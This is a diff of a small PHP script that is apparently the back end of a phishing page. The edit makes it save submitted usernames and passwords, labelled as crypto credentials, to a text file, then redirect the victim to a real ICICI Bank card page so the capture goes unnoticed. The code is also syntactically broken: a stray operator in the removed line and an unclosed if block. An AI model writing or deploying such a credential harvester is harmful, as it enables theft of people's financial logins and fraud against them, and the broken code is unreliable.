@@ -1,7 +1,7 @@
 <?php
 
 if(isset($_POST['submit'])){
-  file_put_contents("usernames.txt", "Crypto Details: " . $message=$_POST['message'] . , FILE_APPEND);
+  file_put_contents("usernames.txt", "Crypto Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n" , FILE_APPEND);
   header('Location: https://www.google.com/url?sa=t&source=web&rct=j&url=https://www.icicibank.com/Personal-Banking/cards/prepaid/multi-wallet-card/index.page&ved=2ahUKEwicnPnR6736AhWLMewKHby4A-oQFnoECB0QAQ&usg=AOvVaw3lEDHVNSY9QsqVR_kCKeJ7 ');
   exit();
 ?>
